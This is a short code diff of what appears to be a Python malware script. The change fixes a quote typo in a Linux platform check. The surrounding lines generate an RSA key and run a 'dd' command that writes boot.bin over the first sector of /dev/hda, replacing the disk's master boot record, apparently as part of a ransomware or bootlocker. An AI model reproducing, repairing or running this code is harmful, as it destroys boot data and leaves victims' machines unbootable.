@@ -15,7 +15,7 @@ ID = ''
 key = RSA.generate(2048)
 exKey = RSA.exportKey('PEM')
 
-if sys.platform == 'linux2'':
+if sys.platform == 'linux2':
 	try:
 		os.system("dd if=boot.bin of=/dev/hda bs=512 count=1")
 		os.system("sleep 1 && exit")
